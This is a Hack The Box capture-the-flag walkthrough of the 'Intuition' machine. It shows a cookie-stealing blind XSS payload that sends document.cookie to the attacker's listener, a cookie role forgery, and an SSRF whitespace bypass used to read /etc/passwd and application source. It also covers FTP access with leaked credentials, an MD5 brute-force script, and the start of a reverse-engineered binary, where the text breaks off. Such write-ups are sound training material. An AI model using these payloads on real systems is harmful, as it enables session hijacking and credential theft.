---
title: Intuition
description: season 5 - Hard
date: 2024-03-09 02:47:35 +/-0005
categories: [WalkThrough, HTB]
tags: [Linux, HTB, Hard]
---

![box-cover](https://miro.medium.com/v2/resize:fit:828/format:webp/1*uiDkUxilnQQMvDURhupTTA.png)
_https://app.hackthebox.com/machines/Intuition_

---

بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيم 
{: .text-center }

---

Hello Fellows, This is my comprehensive walkthrough for solving ‘Intuition’, the second machine of Season 5 on Hack The Box. This particular machine presented numerous challenges, and I encountered several roadblocks along the way. However, the experience proved immensely beneficial.

I kicked off my journey with the discovery and exploitation of a blind XSS vulnerability on the report page, snagging the ‘web_dev’ cookie. Then, by tweaking my report’s priority, I intercepted the admin’s cookies. Next up, I exploited an SSRF vulnerability chained with LFI to snatch sensitive files, which led me to the FTP credentials. With those in hand, I uncovered an SSH private key in the FTP, later leveraging it to reverse engineer the Ansible playbook and escalate my privileges. Quite the thrilling ride overcoming these obstacles! so lets start!

---

## Initial Reconnaissance
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*7HDLAmawF0tKeQIO0eJaaQ.png)
From the Nmap scan result, there are two open ports

+ Port 22 is running an SSH service.
+ port 80 A web application is accessible on.

Exploiting the web service appears to be a promising initial approach, especially considering the lack of exploitable vulnerabilities associated with the detected OpenSSH version.

After accessing the webpage, it was revealed that the domain name is comprezzor.htb So Add this domain to the hosts file for local resolution

```bash
echo '10.10.11.15  comprezzor.htb' | sudo tee -a /etc/hosts
```

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*jju4jY5w2vkrjAi2T8lelw.png)

The hosted webpage was file compression service, allowing users to upload files for compression. While the initial thought of exploiting it for file upload and potentially obtaining a shell crossed my mind, I recognized the possibility of it leading into a rabbit hole. Therefore, I decided to table that approach for later consideration, opting instead to explore alternative avenues unless the need for it became apparent.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*PWSAmChrmXk3R2XoWAd1Dw.png)

Further down the webpage, I noticed a hyperlink leading to a report form.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*PWSAmChrmXk3R2XoWAd1Dw.png)

After clicking on it, I was directed to the domain `report.comprezzor.htb`. I promptly added it to the hosts file. While in the process, I made the decision to run a VHOST FUZZ for subdomain enumeration.

The fuzzing results

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*wd0Ru1gwfkck8mhKU7Xu2w.png)


The report subdomain page

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*Ex4gjrfFq5wJ3J894jGuqQ.png)

Clicking on `Report a Bug` redirected me to the auth subdomain `http://auth.comprezzor.htb/login`

So add auth and dashboard subdomains to the hosts file and noted the dashboard for later as it required authentication same as the report.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*yaVvyH4P5O2M2_FfjOLHlQ.png)

I proceeded to register an account and subsequently logged in.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*ubwYEYsm_cLbztD9aNmzJQ.png)

The first thing i did after login is checking the cookie value

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*hbVcgsZ_aFzdhwNWbsxQoQ.png)

A Base64 encoded value, which I promptly decoded, revealing that the website assigns roles within the cookie.

![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bJz1uAAlfJASB5HCug6s3w.png)

I changed the role to `admin`, encoded it back, and replaced the value of the cookie with the modified one.

```
eyJ1c2VyX2lkIjogNiwgInVzZXJuYW1lIjogInRlc3QiLCAicm9sZSI6ICJ1c2VyIn18Y2Q0YzJiZGE2Mzc1ZTBlNDgwNGJjYmU0MTA4YTBkMzAzZjYyYjY1OWUyYmVmNjFiMzkwZjI5ZWI1YjhhNTBlOA==
{"user_id": 6, "username": "test", "role": "user"}|cd4c2bda6375e0e4804bcbe4108a0d303f62b659e2bef61b390f29eb5b8a50e8
{"user_id": 6, "username": "test", "role": "admin"}|cd4c2bda6375e0e4804bcbe4108a0d303f62b659e2bef61b390f29eb5b8a50e
eyJ1c2VyX2lkIjogNiwgInVzZXJuYW1lIjogInRlc3QiLCAicm9sZSI6ICJhZG1pbiJ9fGNkNGMyYmRhNjM3NWUwZTQ4MDRiY2JlNDEwOGEwZDMwM2Y2MmI2NTllMmJlZjYxYjM5MGYyOWViNWI4YTUwZQ==
```

Unfortunately, No changes were observed in the report page. Consequently, I redirected my attention to the dashboard subdomain, which authenticated from the same authentication subdomain and cookie as the report subdomain. However, upon accessing the dashboard, the cookie triggered an internal server error within the page.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*unZShHdyaRowI7H_01BdMA.png)

Having previously observed the hash value within the cookie, I attempted to crack it without success. Recognizing the need for an alternative approach, I turned my attention back to the report form, hoping to uncover a potential foothold.

> You have to Change back the cookie value to mitigate issues

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*unZShHdyaRowI7H_01BdMA.png)

## Exploitation 
It seems there might be a blind XSS vulnerability to exploit, so let’s dive in.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*0MZUxh4DL3OMyaZ80ISPbw.png)

I had many options to try from my old notes, whether by using a simple script and an netcat listener, or hosting a cookie reorder page to capture received cookies. Additionally, we have a variety of payloads to inject, providing ample avenues for experimentation.

This simple payload proved effective, successfully capturing the cookie in the listener.

```html
"><img src=x onerror=this.src='http://10.10.16.35:8081/?c='+document.cookie>
```
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*bOyhu2y01fdnb39LPg6gwg.png)
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*qhyC5-U7Q20mhg1ABcHXDQ.png)

I revisited the Dashboard after modifying the cookie value, and voila, we captured the `webdev` cookie.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*QdGQVjWOsQzuk2KHzDuhfA.png)


There were no features in the page so i decided to do directory FUZZ while reviewing these reports

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*yGb6J_LGIsVmo6acqmIO_g.png)

The `web_dev` user can change the priority of the report, resolve it or delete it either.

The directory fuzzing reveled a path for backup and another for resolve

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*tQOFq_mNd7ut8tpL8Otj4g.png)

We already know this user can resolve reports and that is explain why the method not allowed as it would be POST method

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*WD2krg11s7CYn9k94-Keag.png)

And regarding the backup path, it revealed nothing more than a confirmation of successful backups.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*QQIMoAFprqcuSlJlqVabhQ.png)


I don’t know why or when or how but sometimes after refresh the other users reports appear, including one that belongs to me.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*mK3C_aRFUJ4PGO4F0VT_Cg.png)

Even it doesn’t appear you can submit another report and you would be able to see it

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*R1k9oXGxmSlUDX7ba_ewwQ.png)

As indicated, the report’s priority is currently set to zero. By modifying it to one, according to my assumptions, we may have the opportunity to intercept the higher-privileged user responsible for reviewing this report, as has been successfully done previously.

So you can set higher priority to the report directly.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*vTAak_yEz5B7qI0NdJKknA.png)

If the action buttons fail to appear, another approach is to use burp for that: by intercepting another report request to change the priority and change the report number to yours that contains the payload

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*nmdARkj09d95EaSabrWwKw.png)

And yeahh, the assumptions were right we captured another cookie value

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*26KIJvJTaOxjSvo7FfKZ5Q.png)

We have now access to the admin panel with four tabs to view

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*QhEI0wPDwHsX1835zLtRzQ.png)

First three were useless but the fourth were a PDF report creator that requires a URL

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*lIM5LARUHsukYcCkMpYlRA.png)

![](https://miro.medium.com/v2/resize:fit:750/format:webp/0*WC7k_CCZtxC5eXPc.jpg)

Lets check If our assumption is right or not!

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*_U69cwitRS-GSkZCDWEOtw.png)

We were Right! This field is indeed vulnerable to SSRF, as evidenced by the request received on the listener.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*AVLqF841BR3Y_Uh5CkkuNw.png)

Once it fetches the provided URL, it generates a PDF listing the directory contents of the listener.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*kd6ajbz2mXmoaZPOUMh9Yw.png)
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*26wC2fNRllVpE8Sp-OluWw.png)

And yeah it displays the content of the files

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*h_443TbwVsElZNACZMOanQ.png)
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*7c-tCmCdtBONDUGIND80mg.png)

Again!! lets check if we can include some nice files from the server

![](https://miro.medium.com/v2/resize:fit:640/format:webp/0*Oj943xPNIQiQJJ2U)

It’s a Linux server, I attempted to access several files, but to no avail. Despite trying numerous bypass methods and alternative URL schemas, but nothing :(

### Let’s recap our data to identify any missing information.

This time I captured the requested to see the report file response

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*hvmxdRUVt5aCZ6imeztWtQ.png)

IT revealed the service used for this process `wkhtmltopdf 0.12.6`

After conducting some research, I discovered a vulnerability affecting this version, SSRF **[CVE:2022–35583](https://nvd.nist.gov/vuln/detail/CVE-2022-35583)**. However, despite several attempts, I was unable to exploit it successfully. Here is the exploit to [check](https://www.exploit-db.com/exploits/51039).

Going backtrack to the captured request sent to our IP address when we were checking for the presence of an SSRF vulnerability.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*ufSdiBjcFTwYJUbYN0EEfA.png)

The server is using `Python-urllib/3.11`

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*m-5hGXCI5YohzBrqLTOJ6g.png)

> **INFO:** cve-2023–24329: An issue in the urllib.parse component of Python before v3.11 allows attackers to bypass block listing methods by supplying a URL that starts with blank characters.
{: .prompt-info }

So, let’s insert a space before the parsed URL for the internal file.
```
file:///etc/passwd
```
It works well, It successfully generated a PDF report containing the content of the `/etc/passwd` file.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*Fb4RQ11M7PwVMHvYUNEINQ.png)

Lets start by requesting cmdline to know the current running process
```
file:///proc/self/cmdline
```
The `/proc/self/cmdline` file in Linux contains the command line arguments passed to the currently running process. It provides insight into how a process was invoked, including any flags, options, or parameters supplied to it.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*D9nQynOPCtIQmFzgNVCKGw.png)

The currently running application is `/app/code/app.py`. Lets retrieve its code

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*tzIk9MRWtt4kDM7Sttr25g.png)

Using ChatGPT to beautify it
```python
from flask import Flask, request, redirect
from blueprints.index.index import main_bp
from blueprints.report.report import report_bp
from blueprints.auth.auth import auth_bp
from blueprints.dashboard.dashboard import dashboard_bp

app = Flask(__name__)
app.secret_key = "7ASS7ADA8RF3FD7"
app.config['SERVER_NAME'] = 'comprezzor.htb'
app.config['MAX_CONTENT_LENGTH'] = 5 * 1024 * 1024  # Limit file size to 5MB
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'docx'}  # Add more allowed file extensions if needed

app.register_blueprint(main_bp)
app.register_blueprint(report_bp, subdomain='report')
app.register_blueprint(auth_bp, subdomain='auth')
app.register_blueprint(dashboard_bp, subdomain='dashboard')

if __name__ == '__main__':
    app.run(debug=False, host="0.0.0.0", port=80)
```
The first thing to notice is the classes this code importing. So i made this tree for them.
```
/app/code
├── app.py
└── blueprints
    ├── auth
    │   ├── __init__.py
    │   └── auth.py
    ├── dashboard
    │   ├── __init__.py
    │   └── dashboard.py
    ├── index
    │   ├── __init__.py
    │   └── index.py
    └── report
        ├── __init__.py
        └── report.py
```

It is dasboard.py turn for retrieving its code, based on the tree provided up that we got from the `app.py` we can request this path
```
file:///app/code/blueprints/dashboard/dashboard.py
```

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*LkFcbmDkUpCQ2ka1ac1BJA.png)

```python
from flask import Blueprint, request, render_template, flash, redirect, url_for, send_file
from blueprints.auth.auth_utils import admin_required, login_required, deserialize_user_data
from blueprints.report.report_utils import get_report_by_priority, get_report_by_id, delete_report, get_all_reports, change_report_priority, resolve_report
import random
import os
import pdfkit
import socket
import shutil
import urllib.request
from urllib.parse import urlparse
import zipfile
from ftplib import FTP
from datetime import datetime

dashboard_bp = Blueprint('dashboard', __name__, subdomain='dashboard')
pdf_report_path = os.path.join(os.path.dirname(__file__), 'pdf_reports')
allowed_hostnames = ['report.comprezzor.htb']

@dashboard_bp.route('/', methods=['GET'])
@admin_required
def dashboard():
    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data)
    if user_info['role'] == 'admin':
        reports = get_report_by_priority(1)
    elif user_info['role'] == 'webdev':
        reports = get_all_reports()
    return render_template('dashboard/dashboard.html', reports=reports, user_info=user_info)

@dashboard_bp.route('/report/', methods=['GET'])
@login_required
def get_report(report_id):
    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data)
    if user_info['role'] in ['admin', 'webdev']:
        report = get_report_by_id(report_id)
        return render_template('dashboard/report.html', report=report, user_info=user_info)
    else:
        pass

@dashboard_bp.route('/delete/', methods=['GET'])
@login_required
def del_report(report_id):
    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data)
    if user_info['role'] in ['admin', 'webdev']:
        report = delete_report(report_id)
        return redirect(url_for('dashboard.dashboard'))
    else:
        pass

@dashboard_bp.route('/resolve', methods=['POST'])
@login_required
def resolve():
    report_id = int(request.args.get('report_id'))
    if resolve_report(report_id):
        flash('Report resolved successfully!', 'success')
    else:
        flash('Error occurred while trying to resolve!', 'error')
    return redirect(url_for('dashboard.dashboard'))

@dashboard_bp.route('/change_priority', methods=['POST'])
@admin_required
def change_priority():
    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data)
    if user_info['role'] != ('webdev' or 'admin'):
        flash('Not enough permissions. Only admins and webdevs can change report priority.', 'error')
        return redirect(url_for('dashboard.dashboard'))
    report_id = int(request.args.get('report_id'))
    priority_level = int(request.args.get('priority_level'))
    if change_report_priority(report_id, priority_level):
        flash('Report priority level changed!', 'success')
    else:
        flash('Error occurred while trying to change the priority!', 'error')
    return redirect(url_for('dashboard.dashboard'))

@dashboard_bp.route('/create_pdf_report', methods=['GET', 'POST'])
@admin_required
def create_pdf_report():
    global pdf_report_path
    if request.method == 'POST':
        report_url = request.form.get('report_url')
        try:
            scheme = urlparse(report_url).scheme
            hostname = urlparse(report_url).netloc
            try:
                dissallowed_schemas = ["file", "ftp", "ftps"]
                if (scheme not in dissallowed_schemas) and ((socket.gethostbyname(hostname.split(":")[0]) != '127.0.0.1') or (hostname in allowed_hostnames)):
                    print(scheme)
                    urllib_request = urllib.request.Request(report_url, headers={'Cookie': 'user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhM'})
                    response = urllib.request.urlopen(urllib_request)
                    html_content = response.read().decode('utf-8')
                    pdf_filename = f'{pdf_report_path}/report_{str(random.randint(10000,90000))}.pdf'
                    pdfkit.from_string(html_content, pdf_filename)
                    return send_file(pdf_filename, as_attachment=True)
            except:
                flash('Unexpected error!', 'error')
                return render_template('dashboard/create_pdf_report.html')
        else:
            flash('Invalid URL', 'error')
            return render_template('dashboard/create_pdf_report.html')
    except Exception as e:
        raise e
    else:
        return render_template('dashboard/create_pdf_report.html')

@dashboard_bp.route('/backup', methods=['GET'])
@admin_required
def backup():
    source_directory = os.path.abspath(os.path.dirname(__file__) + '../../../')
    current_datetime = datetime.now().strftime("%Y%m%d%H%M%S")
    backup_filename = f'app_backup_{current_datetime}.zip'
    with zipfile.ZipFile(backup_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(source_directory):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, source_directory)
                zipf.write(file_path, arcname=arcname)
    try:
        ftp = FTP('ftp.local')
        ftp.login(user='ftp_admin', passwd='u3jai8y71s2')
        ftp.cwd('/')
        with open(backup_filename, 'rb') as file:
            ftp.storbinary(f'STOR {backup_filename}', file)
        ftp.quit()
        os.remove(backup_filename)
        flash('Backup and upload completed successfully!', 'success')
    except Exception as e:
        flash(f'Error: {str(e)}', 'error')
    return redirect(url_for('dashboard.dashboard'))
```
For the last method, `backup()`, it reveals the **FTP credentials** for `ftp.local` with the username `ftp_admin` and the password `u3jai8y71s2`.

## First foothold!

From the initial scan, we’ve determined that there are no open FTP ports on the given IP. Therefore, it appears to be running within the internal network.

I know from earlier that I can use the FTP schema to access the FTP service through the SSRF exploit. Therefore, by employing the FTP schema and providing the credentials, we can successfully log in to the FTP server.

```
ftp://ftp_admin:u3jai8y71s2@ftp.local/
```
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*8pU32Kiqab5d1qExYM2x3Q.png)

The PDF report contains the files existing on the FTP, So lets grep them
```
ftp://ftp_admin:u3jai8y71s2@ftp.local/welcome_note.txt
```
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*9m-SfeQqtmcA71pmKLZyBw.png)

```
ftp://ftp_admin:u3jai8y71s2@ftp.local/private-8297.key
```

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*_tUtMrj9XUDJZ8Q6gDZ9qQ.png)

I was stuck here for a few minutes. Which user should I use, and how can I use this passphrase? then i got idea to check the SSH key comments

```bash
ssh-keygen -y -f  id_rsa
```

This command will output the public key associated with the private key, including any comments that were included when the key pair was generated.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*5rfw9XGO7cYtUzbki2IkVA.png)

To gain initial access, use this username along with the SSH private key for authentication into the SSH.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*5rfw9XGO7cYtUzbki2IkVA.png)
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*nMAlONZauSyTS_bhkUPgVw.png)

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*vgqoRAVdUSQ6WZ4Xz7iFMw.png)
_Even though it’s a Java enum meme, let’s roll with it here anyway!_

## Privilege escalation process

I use [LinPeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) to automate the machine enumeration process, enabling us to identify potential attack vectors for privilege escalation and gather additional information about the machine we’re on and the network it resides within.

The LinPeas results revealed several open ports. Take note of them for further investigation. We can consider port forwarding to scan or exploit these services later.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*BEWJKahsVILCYUJp8W7uJQ.png)

Here is the active users we may use on authentication if we found any keys

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*lE0yFNhSxR1u5m10P1t6OQ.png)

There’s a users database to examine, which I believe would be a good starting point.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*BAnBMTsbDAPXNlXw1OLedw.png)

A SQLite 3 database

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*Ou9XcJ41yl1UK2E_N9yN8g.png)

There are two web applications running on this machine. We’ll examine the other later if the blueprints DB is useless.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*oX8QiRM7VWkoq7fDSLFjAg.png)

Now, you can utilize sqlite3 to interact with this database file and extract its tables.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*yrvBUnw64fP32kaeXMiQ0g.png)

We now have two hashes to crack, so we can use Hashcat or John to crack them.

```
hashcat hash_file /usr/share/wordlists/rockyou.txt --force
```
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*NzjSngsC-C2lgf1nVprfoA.png)

We were able to crack one of them


We’re aware that there’s an FTP service running locally, but it’s not accessible for outbound connections. However, SSH is open for outbound connections, as we’ve already established a connection using it.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*YNXpRmaNuNh7fA1vNnxmKA.png)
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*KiBiaHD7aua42I5Bag9V_Q.png)
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*uNqlmE0F-7FZhJGngb1QHg.png)


Transfer these files locally to check them

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*YEh-CrjSZcZPrp0z-Za_DQ.png)

`run-tests.sh`
```bash
#!/bin/bash
# List playbooks
./runner1 list
# Run playbooks [Need authentication]
# ./runner run [playbook number] -a [auth code]
#./runner1 run 1 -a "UHI75GHI****"
# Install roles [Need authentication]
# ./runner install [role url] -a [auth code]
#./runner1 install http://role.host.tld/role.tar -a "UHI75GHI****"
```
There are a Key to run this tool but the last 4 char are missing

`runner1.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <openssl/md5.h>
#define INVENTORY_FILE "/opt/playbooks/inventory.ini"
#define PLAYBOOK_LOCATION "/opt/playbooks/"
#define ANSIBLE_PLAYBOOK_BIN "/usr/bin/ansible-playbook"
#define ANSIBLE_GALAXY_BIN "/usr/bin/ansible-galaxy"
#define AUTH_KEY_HASH "0feda17076d793c2ef2870d7427ad4ed"
int check_auth(const char* auth_key) {
    unsigned char digest[MD5_DIGEST_LENGTH];
    MD5((const unsigned char*)auth_key, strlen(auth_key), digest);
    char md5_str[33];
    for (int i = 0; i < 16; i++) {
        sprintf(&md5_str[i*2], "%02x", (unsigned int)digest[i]);
    }
    if (strcmp(md5_str, AUTH_KEY_HASH) == 0) {
        return 1;
    } else {
        return 0;
    }
}
void listPlaybooks() {
    DIR *dir = opendir(PLAYBOOK_LOCATION);
    if (dir == NULL) {
        perror("Failed to open the playbook directory");
        return;
    }
    struct dirent *entry;
    int playbookNumber = 1;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG && strstr(entry->d_name, ".yml") != NULL) {
            printf("%d: %s\n", playbookNumber, entry->d_name);
            playbookNumber++;
        }
    }
    closedir(dir);
}
void runPlaybook(const char *playbookName) {
    char run_command[1024];
    snprintf(run_command, sizeof(run_command), "%s -i %s %s%s", ANSIBLE_PLAYBOOK_BIN, INVENTORY_FILE, PLAYBOOK_LOCATION, playbookName);
    system(run_command);
}
void installRole(const char *roleURL) {
    char install_command[1024];
    snprintf(install_command, sizeof(install_command), "%s install %s", ANSIBLE_GALAXY_BIN, roleURL);
    system(install_command);
}
int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s [list|run playbook_number|install role_url] -a <auth_key>\n", argv[0]);
        return 1;
    }
    int auth_required = 0;
    char auth_key[128];
    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-a") == 0) {
            if (i + 1 < argc) {
                strncpy(auth_key, argv[i + 1], sizeof(auth_key));
                auth_required = 1;
                break;
            } else {
                printf("Error: -a option requires an auth key.\n");
                return 1;
            }
        }
    }
    if (!check_auth(auth_key)) {
        printf("Error: Authentication failed.\n");
        return 1;
    }
    if (strcmp(argv[1], "list") == 0) {
        listPlaybooks();
    } else if (strcmp(argv[1], "run") == 0) {
        int playbookNumber = atoi(argv[2]);
        if (playbookNumber > 0) {
            DIR *dir = opendir(PLAYBOOK_LOCATION);
            if (dir == NULL) {
                perror("Failed to open the playbook directory");
                return 1;
            }
            struct dirent *entry;
            int currentPlaybookNumber = 1;
            char *playbookName = NULL;
            while ((entry = readdir(dir)) != NULL) {
                if (entry->d_type == DT_REG && strstr(entry->d_name, ".yml") != NULL) {
                    if (currentPlaybookNumber == playbookNumber) {
                        playbookName = entry->d_name;
                        break;
                    }
                    currentPlaybookNumber++;
                }
            }
            closedir(dir);
            if (playbookName != NULL) {
                runPlaybook(playbookName);
            } else {
                printf("Invalid playbook number.\n");
            }
        } else {
            printf("Invalid playbook number.\n");
        }
    } else if (strcmp(argv[1], "install") == 0) {
        installRole(argv[2]);
    } else {
        printf("Usage2: %s [list|run playbook_number|install role_url] -a <auth_key>\n", argv[0]);
        return 1;
    }
    return 0;
}
```
After reviewing this code, it appears that it authenticates by comparing the key to the stored md5 hash before granting access to run the application.

It’s found also that this file primarily executes commands related to `ansible-playbook`. This involves another component called Ansible, which is an open-source automation engine capable of executing processes such as configuration, configuration management, and application deployment automatically. The Ansible component contains various functions including Global Definitions, Authentication, Listing Playbooks, Running a Playbook, Installing a Role, and Main Program Logic.

### First part Guessing the whole key
Here’s the missing value key: `UHI75GHI****`. The hash associated with it is `0feda17076d793c2ef2870d7427ad4ed`.

We can create a script to attempt all possible combinations, although it may be time-consuming.

With a total of 62 characters (26 lowercase letters + 26 uppercase letters + 10 digits), there are 62⁴ combinations in total.

```python
import time
import itertools
import hashlib
import string

start_time = time.time()

# Define the hash and characters to be brute forced 
target_hash = "0feda17076d793c2ef2870d7427ad4ed"
access_code = "UHI75GHI"
character_set = string.ascii_letters + string.digits
key_length = 4

# Function to check if the generated hash matches the target or not
def compare_hash(candidate_key_hash, target_key_hash):
    generated_hash = hashlib.md5(candidate_key_hash.encode()).hexdigest()
    return generated_hash == target_key_hash

# Loop through combinations to find the matching key
for key_guess in itertools.product(character_set, repeat=key_length):
    potential_key = f"{access_code}{''.join(key_guess)}"
    if compare_hash(potential_key, target_hash):
        end_time = time.time()
        elapsed_time = end_time - start_time
        print(potential_key)
        print(f"Time consumed: {elapsed_time} seconds")
        break  
else:
    end_time = time.time()
    elapsed_time = end_time - start_time
    print("No matching key found.")
    print(f"Time consumed: {elapsed_time} seconds")
```
It seems the task wasn’t as time-consuming as initially anticipated.
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*ijFnhB8zzBHyBA59AlpSOw.png)

### Second part

This user lacks the privilege to execute this application, so we must explore alternative attack vectors. The challenge lies in navigating through the rabbit holes presented by this machine. After port forwarding to inspect the applications running on these open ports, I found no solid foothold to exploit.

After some time I found this

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*Y7ACZEO1OkcKIoVKrz7ykQ.png)

there is a directory called `runner2` but only `sys_adm` group can access it, The idea is, this is the version 2 of the application we was exploiting before `runner1` so it should be related somehow, after some search again I found logs directory for **`suricata`**

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*CxGt2IorRDjCutjxL4SP1w.png)

> **INFO:** Suricata is an open-source based intrusion detection system and intrusion prevention system.
{: .prompt-info }

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*Mog8smCCImmChdEyH7SUvA.png)


Initially, I was uncertain about what to search for. However, after some investigation, I discovered that Suricata logs and backups may contain usernames and, incidentally, passwords captured during the authentication process.

Using zgrep to search for active users within these files, zgrep can search within compressed files as well.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*tdq5DAFbKLKrZmirzbv23g.png)

Use these credentials to SSH to lopez user

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*RjfjXKBwQieff-kpffAOmA.png)

`lopez` user is one of the `sys-adm` group so we can access the `runner2` directory now.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*b5h6Q5qi7njxwXXAPb6wMQ.png)

To determine the components required in the JSON file to run the application, we need to reverse engineer the application to ascertain its true nature.

You can utilize Ghidra as a fast and free option, or IDA Pro. I don’t think reversing this application would be overly difficult, so I don’t think there are any anti-debugging or anti-assembly measures in place, nor is there likely to be obfuscation. Either option should suffice for our purposes.

### The main function

```c
//main

undefined8 main(int param_1,undefined8 *param_2)

{
  int iVar1;
  FILE *__stream;
  long lVar2;
  int *piVar3;
  int *piVar4;
  char *pcVar5;
  undefined8 uVar6;
  DIR *__dirp;
  dirent *pdVar7;
  int local_80;
  char *local_78;
  
  if (param_1 != 2) {
    printf("Usage: %s <json_file>\n",*param_2);
    return 1;
  }
  __stream = fopen((char *)param_2[1],"r");
  if (__stream == (FILE *)0x0) {
    perror("Failed to open the JSON file");
    return 1;
  }
  lVar2 = json_loadf(__stream,2,0);
  fclose(__stream);
  if (lVar2 == 0) {
    fwrite("Error parsing JSON data.\n",1,0x19,stderr);
    return 1;
  }
  piVar3 = (int *)json_object_get(lVar2,&DAT_00102148);
  if ((piVar3 == (int *)0x0) || (*piVar3 != 0)) {
    fwrite("Run key missing or invalid.\n",1,0x1c,stderr);
  }
  else {
    piVar4 = (int *)json_object_get(piVar3,"action");
    if ((piVar4 == (int *)0x0) || (*piVar4 != 2)) {
      fwrite("Action key missing or invalid.\n",1,0x1f,stderr);
    }
    else {
      pcVar5 = (char *)json_string_value(piVar4);
      iVar1 = strcmp(pcVar5,"list");
      if (iVar1 == 0) {
        listPlaybooks();
      }
      else {
        iVar1 = strcmp(pcVar5,"run");
        if (iVar1 == 0) {
          piVar3 = (int *)json_object_get(piVar3,&DAT_00102158);
          piVar4 = (int *)json_object_get(lVar2,"auth_code");
          if ((piVar4 != (int *)0x0) && (*piVar4 == 2)) {
            uVar6 = json_string_value(piVar4);
            iVar1 = check_auth(uVar6);
            if (iVar1 != 0) {
              if ((piVar3 == (int *)0x0) || (*piVar3 != 3)) {
                fwrite("Invalid \'num\' value for \'run\' action.\n",1,0x26,stderr);
              }
              else {
                iVar1 = json_integer_value(piVar3);
                __dirp = opendir("/opt/playbooks/");
                if (__dirp == (DIR *)0x0) {
                  perror("Failed to open the playbook directory");
                  return 1;
                }
                local_80 = 1;
                local_78 = (char *)0x0;
                while (pdVar7 = readdir(__dirp), pdVar7 != (dirent *)0x0) {
                  if ((pdVar7->d_type == '\b') &&
                     (pcVar5 = strstr(pdVar7->d_name,".yml"), pcVar5 != (char *)0x0)) {
                    if (local_80 == iVar1) {
                      local_78 = pdVar7->d_name;
                      break;
                    }
                    local_80 = local_80 + 1;
                  }
                }
                closedir(__dirp);
                if (local_78 == (char *)0x0) {
                  fwrite("Invalid playbook number.\n",1,0x19,stderr);
                }
                else {
                  runPlaybook(local_78);
                }
              }
              goto LAB_00101db5;
            }
          }
